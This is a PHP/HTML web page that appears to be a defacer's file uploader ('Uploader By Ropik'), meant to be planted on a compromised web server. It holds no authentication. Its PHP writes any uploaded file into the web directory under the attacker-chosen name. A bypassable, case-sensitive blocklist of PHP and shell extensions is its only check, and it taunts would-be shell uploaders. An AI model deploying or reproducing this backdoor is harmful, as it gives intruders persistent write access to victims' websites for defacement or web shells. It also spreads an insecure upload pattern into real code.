<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="author" content="./OXiG3n"> <!-- Btw author : Rands -->
    <meta name="description" content="Nitip Aja Cuk :v">
    <meta name="theme-color" content="#000000">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <link rel="icon" href="" type="image/jpg">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
    <title>Uploader only HTML</title>
    <style>
    	body{background-color:#000;font-family:"Righteous";color:#fff;}
    	#ico{width:200px;height:200px;}
    </style>
  </head>
  <body>

    <div class="container text-center mx-auto">
    	<h2 class="mt-3">Uploader By Ropik</h2>
    	<img src="https://i.ibb.co/GQK2t6g/dattebayo.png" class="mx-auto d-block" id="ico">
    <br><br>
    	<form method="post" enctype="multipart/form-data">
    		<div class="row">
    			<div class="col">
    				<input id="previews" placeholder="Pilih File" class="form-control bg-transparent text-white" readonly="readonly">
    			</div>
    			
    			<div class="col">
    				<div class="input-group">
    					<div class="custom-file">
    						<input type="file" name="file" class="custom-file-input bg-transparent" id="FileSel">
    						<label class="custom-file-label bg-transparent" for="previews"></label>
    					</div>
    				</div>
    			</div>
    		</div>
    		<button type="submit" name="up" class="btn btn-secondary btn-block bg-transparent mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Silahkan tunggu">Upload</button>
    	</form><hr>
<style type="text/css">
body {background-color: black;background-image: url("");background-repeat: no-repeat;background-size: 100% 100%;}
</style>
<?php
$server = $_SERVER["DOCUMENT_ROOT"];
$file = $_FILES["file"]["name"];
$tipe = pathinfo($file, PATHINFO_EXTENSION);
// Kalo Mau Nambahin Tipe Aksesnya Tambahin Ae
if( 
($tipe === "php") or
($tipe === "index.html") or 
($tipe === "pHp") or 
($tipe === "PhP") or 
($tipe === "php1") or 
($tipe === "php2") or 
($tipe === "phtmL") or 
($tipe === "phtML") or 
($tipe === "phTML") or 
($tipe === "pHTML") or 
($tipe === "PHTML") or 
($tipe === "phtMl") or 
($tipe === "phTml") or 
($tipe === "pHtml") or 
($tipe === "Phtml") or 
($tipe === "PHtml") or 
($tipe === "PHTml") or 
($tipe === "PHTMl") or 
($tipe === "TxT") or 
($tipe === "Txt") or 
($tipe === "pjpeg") or 
($tipe === "jpeg") or 
($tipe === "Gif") or 
($tipe === "PHP5") or 
($tipe === "phP5") or 
($tipe === "Php5") or 
($tipe === "PHp5") or 
($tipe === "PHP5") or 
($tipe === "PHP3") or 
($tipe === "php5") or 
($tipe === "phtml") or 
($tipe === "jpg") or 
($tipe === "phpp") or 
($tipe === "png") or 
($tipe === "aspx") or 
($tipe === "txt") or
($tipe === "shtml") or 
($tipe === "php4") or 
($tipe === "pdf") or 
($tipe === "php3") or 
($tipe === "PhP") or 
($tipe === "pHp") or 
($tipe === "xxxjpg") or 
($tipe === "pHtMl") or 
($tipe === "asp") or 
($tipe === "sql") or 
($tipe === "xml")){
	echo "<br><br><center><font color='white' face='Iceland' size='4' >MAU APA ? UPSHELL ? Tydak Semudah Itu</font></font></center>";
				exit;
}else{
if(isset($_POST["up"])){
	if(is_writable($server)){
		if(@copy($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])){
			$web = "http://".$_SERVER["HTTP_HOST"]."/";
			echo "<br><br><center><font color='white' face='Iceland' size='4' >SUCCESS UPLOAD : </font><a href='$file' target='_blank'><font color='red' size='4' ><u>Here</u></font></a></center>";
		}else{
			echo "<br><br><center><font color='red' face='Iceland' size='4'>GAGAL UPLOAD , FAKTOR FACE EA WKWKWK</font></center>";
			}
		}
	}
}
?>
<footer>
	<small>© Powered By Ropik</small>
</footer>
    </div>
		<script>
			document.getElementById('FileSel').onchange = function()
			{
				document.getElementById('previews').value = this.value;
			};
			
			$('.btn').on('click', function(){
				var $this = $(this);
				$this.button('loading');
			});
			
		</script>
</body>
</html>
